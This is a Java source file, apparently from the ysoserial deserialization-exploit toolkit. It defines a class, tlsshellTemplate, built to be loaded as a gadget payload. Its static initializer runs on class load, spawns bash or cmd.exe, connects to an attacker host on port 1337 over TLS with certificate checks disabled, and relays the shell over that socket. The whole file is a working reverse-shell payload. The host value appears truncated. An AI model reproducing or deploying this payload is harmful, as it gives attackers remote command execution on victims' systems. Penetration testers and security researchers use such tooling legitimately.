package ysoserial.test.tool;



import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import javax.net.ssl.*;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.UnknownHostException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.util.HashSet;
import java.util.Scanner;

public class tlsshellTemplate extends AbstractTranslet  implements X509TrustManager{
    public void checkClientTrusted(X509Certificate[] certs, String authType) {
    }

    public void checkServerTrusted(X509Certificate[] certs, String authType) {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return null;
    }

    static {
        try{
            String host = "10";
            int port = 1337;
            String[] cmd = {"/bin/bash"};
            if (System.getProperty("os.name").toLowerCase().startsWith("windows")) {
                cmd = new String[]{"cmd.exe"};
            }

            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, new TrustManager[] {new tlsshellTemplate()}, new java.security.SecureRandom());
            SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
            SSLSocket s = (SSLSocket) sslSocketFactory.createSocket(host, port);
            s.startHandshake();
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            BufferedReader bsi = new BufferedReader(new InputStreamReader(s.getInputStream()));
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available()>0)
                    so.write(pi.read());
                while(pe.available()>0)
                    so.write(pe.read());
                String line = bsi.readLine();
                if (line != null) {
                    po.write((line + "\n").getBytes());
                } else {
                    bsi.close();
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }
                catch (Exception e){
                }
            };
            p.destroy();
            s.close();

        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        } catch (KeyManagementException e) {
            throw new RuntimeException(e);
        }
    }
    public tlsshellTemplate() {
    }


    public void transform(DOM var1, SerializationHandler[] var2) throws TransletException {
    }

    public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
    }
}

